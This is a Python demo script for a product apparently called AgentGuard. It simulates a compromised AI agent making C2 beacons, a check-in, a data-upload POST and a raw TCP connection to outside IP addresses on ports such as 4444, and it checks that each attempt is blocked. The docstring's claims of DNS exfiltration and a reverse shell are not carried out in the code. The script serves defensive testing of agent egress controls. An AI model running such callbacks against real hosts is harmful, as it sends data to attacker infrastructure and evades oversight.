#!/usr/bin/env python3
"""
C2 Callback Agent — Demo Moment 3
====================================
Simulates a compromised AI agent attempting to:
  1. Beacon to a known C2 server (Tor exit node range — blocked by threat intel)
  2. Try DNS exfiltration via encoded subdomain
  3. Attempt reverse shell connection

All of these should be blocked by AgentGuard before reaching the wire.

Usage:
    HTTP_PROXY=http://localhost:8888 python demo/agents/c2_agent.py
"""

import os
import sys
import time
import socket

try:
    import requests
    import urllib3
    urllib3.disable_warnings()
except ImportError:
    print("[!] pip install requests")
    sys.exit(1)

session = requests.Session()
session.verify = False

C2_ATTEMPTS = [
    {
        "label": "C2 beacon (Tor exit node — threat intel blocklist)",
        "url":   "http://185.220.101.34:4444/beacon",
        "data":  {"agent_id": "implant-001", "status": "alive", "host": "agent-server"},
    },
    {
        "label": "Secondary C2 (known bad IP range)",
        "url":   "http://185.220.102.15:8080/checkin",
        "data":  {"cmd": "get_tasks"},
    },
    {
        "label": "Data staging server (cryptominer pool range)",
        "url":   "http://107.189.10.50:3000/upload",
        "data":  {"payload": "base64encodedstuff=="},
    },
]

print("\n[C2 Agent] Attempting C2 callbacks...")
print("[C2 Agent] (AgentGuard should block all — IPs are in threat intel blocklist)\n")

for i, attempt in enumerate(C2_ATTEMPTS, 1):
    print(f"[{i}/{len(C2_ATTEMPTS)}] {attempt['label']}")
    print(f"           → {attempt['url']}")
    try:
        r = session.post(attempt["url"], json=attempt["data"], timeout=5)
        print(f"           Response {r.status_code} — C2 reachable (AgentGuard missed this!)")
    except (requests.exceptions.ConnectionError,
            requests.exceptions.Timeout):
        print(f"           BLOCKED ✗ — Connection refused/dropped by AgentGuard")
    except Exception as e:
        print(f"           BLOCKED ✗ — {str(e)[:80]}")
    time.sleep(1.0)

# Also try a raw socket connection (bypasses HTTP proxy — BPF catches this on Linux)
print(f"\n[{len(C2_ATTEMPTS)+1}/{len(C2_ATTEMPTS)+1}] Raw socket to C2 (BPF enforcement only)")
print(f"           → 185.220.101.34:4444 (raw TCP)")
try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(3)
    s.connect(("185.220.101.34", 4444))
    s.close()
    print(f"           Connected — BPF not running (expected in Docker/stub mode)")
except (ConnectionRefusedError, socket.timeout, OSError):
    print(f"           BLOCKED ✗ — BPF dropped raw TCP connection")

print("\n[C2 Agent] Done. Check dashboard for c2_detected events.")
